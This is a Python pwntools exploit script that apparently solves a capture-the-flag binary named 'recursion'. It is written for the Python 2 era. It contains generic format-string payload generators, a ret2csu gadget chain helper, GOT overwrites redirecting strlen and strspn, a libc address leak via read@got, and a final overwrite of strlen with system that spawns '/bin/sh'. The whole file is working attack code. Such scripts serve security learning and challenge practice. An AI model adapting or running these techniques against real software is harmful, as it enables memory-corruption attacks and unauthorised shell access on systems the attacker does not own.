from pwn import *

# context.log_level = 'debug'
# context.aslr = False

io = process('./recursion')
e = ELF('./recursion')
libc = e.libc

def com_gadet(func_ptr, arg1=0, arg2=0, arg3=0):
    addr1 = 0x00401866
    addr2 = 0x00401850
    payload = ''
    payload += p64(addr1) 
    payload += 'A' * 8       # add     rsp, 8
    payload += p64(0x0)      # rbx = 0
    payload += p64(0x1)      # rbp = 1
    payload += p64(func_ptr) # r12
    payload += p64(arg3)     # r13 = rdx = arg3
    payload += p64(arg2)     # r14 = rsi
    payload += p64(arg1)     # r15d = edi
    payload += p64(addr2)    # call *func_ptr
    payload += 'A'* 8 * 7    
    return payload

def answer(recv_buf, send_buf, newline= True):
    io.recvuntil(recv_buf)
    if newline:
        io.sendline(send_buf)
    else:
        io.send(send_buf)

def gen_fmt_payload(write_map, write_bits='hn', printed=0, testing=False):
    """
    Format string payload generator.
    write_map:  [(write_value,arg_index eg),..]: [(0xdead,0x12), (0xbeef,0x13)]
    write_bits: n, hn, hhn
    printed:  bytes has been printed.
    testing: return %p format to test address.

    write_map = [(0xdead,0x10), (0xbeef,0x11)]
    payload = gen_fmt_payload(write_map)
    """
    if testing:
        payload =  ''.join('%{}$p'.format(idx) for value,idx in sorted(write_map))

    else:
        payload = ''
        # sorted by value in ascending order.   
        for value, idx in sorted(write_map):  
            n_char = value - printed
            assert n_char >= 0, "printed:%d, value=%d" % (printed, value)
            if n_char > 0:
                payload += '%{}c'.format(n_char)
            # else n_char == 0, then just without %c
            payload += '%{}${}'.format(idx, write_bits)
            
            printed = value 

    print '[+++++++++++] format payload: ' + payload
    return payload


def gen_map_and_addr(buf, addr, idx_base, write_bits='hn', printed = 0):
    """
    writing buf to addr. 
    """
    write_map = [] # [(value, idx),..]
    addr_buf = ''

    if write_bits == 'hn':
        if len(buf) % 2 == 1: buf += '\x00' # align.
        for i in range(0, len(buf), 2):
            value = u16(buf[i:i+2])
            while value < printed: value += 0x10000
            idx = i/2 + idx_base
            write_map.append((value, idx))
            addr_buf += p32(addr + i)        # 64 bit change this!!!

    if write_bits == 'hhn':
        for i in range(len(buf)):
            value = ord(buf[i])
            while value < printed: value += 0x100
            idx = i + idx_base
            write_map.append((value, idx))
            addr_buf += p32(addr + i)

    return write_map, addr_buf

#   .text:08048CB9                 call    _printf
# printf@got 0x804b010

gdb.attach(io, 'b*0x08048C4E\nb*0x08048CB9')

bss_addr = 0x804B058
main = 0x8048B37 

# strlen -> printf , strspn -> main, then we get read -> printf -> fflush loop !!! 
write_map1 , addr_buf1 = gen_map_and_addr(p32(e.plt['printf']), e.got['strlen'], 66+14, 'hhn')
write_map2 , addr_buf2 = gen_map_and_addr(p32(main), e.got['strspn'], 66+14+4, 'hhn')

buf = gen_fmt_payload(write_map1+write_map2,'hhn')
buf = buf.encode('base64').replace('\n','')

buf += '\x00'
assert len(buf) < 0x100
buf = buf.ljust(0x100)
# buf += 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%b'
buf += p32(bss_addr) * 14 # strlen->printf will write to here.
buf += addr_buf1 + addr_buf2
answer('Recursion\n',buf)

# print *read@got
buf = '%28$s'
buf = buf.ljust(0x30,'\x00')
buf += p32(e.got['read'])
answer('Recursion\n',buf)

# rebase libc.
read_addr = u32(io.recv(4))
log.success("read=%#x"% read_addr)
libc.address = read_addr - libc.symbols['read']
sys_addr = libc.symbols['system']

# write strlen->system
write_map , addr_buf = gen_map_and_addr(p32(sys_addr), e.got['strlen'], 28, 'hhn')
buf = gen_fmt_payload(write_map,'hhn')
buf = buf.ljust(0x30,'\x00')
buf += addr_buf
answer('Recursion\n',buf)

# system("/bin/sh")
answer('Recursion\n', '/bin/sh')
io.interactive()